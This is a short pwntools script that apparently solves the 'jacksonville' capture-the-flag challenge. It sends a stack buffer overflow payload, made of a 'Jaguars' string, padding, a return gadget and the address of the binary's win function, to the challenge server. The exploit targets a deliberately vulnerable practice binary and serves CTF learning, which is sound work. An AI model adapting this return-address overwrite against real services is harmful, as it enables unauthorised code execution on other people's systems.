from pwn import *

elf = ELF("./jacksonville")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

p = remote("chal.sunshinectf.games", 25602)
# p = process(["./jacksonville"])
# gdb.attach(p)
# pause()
p.recvuntil(b"> ")
ret_gadget = 0x40101A # ensure stack is aligned
p.sendline(
    b"A" * 6 + b"Jaguars\0" + b"A" * 90 + p64(ret_gadget) + p64(elf.symbols["win"])
)
p.interactive()

